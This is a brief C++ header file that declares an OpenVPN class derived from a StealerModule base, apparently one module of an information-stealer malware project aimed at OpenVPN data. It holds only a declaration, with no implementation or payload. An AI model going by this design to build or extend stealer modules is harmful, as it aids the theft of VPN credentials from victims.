//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_OPENVPN_H
#define STEALER_OPENVPN_H


#include "../../../StealerModule.h"

class OpenVPN : public StealerModule {
public:
    void execute(fs::path &root) override;
};


#endif //STEALER_OPENVPN_H
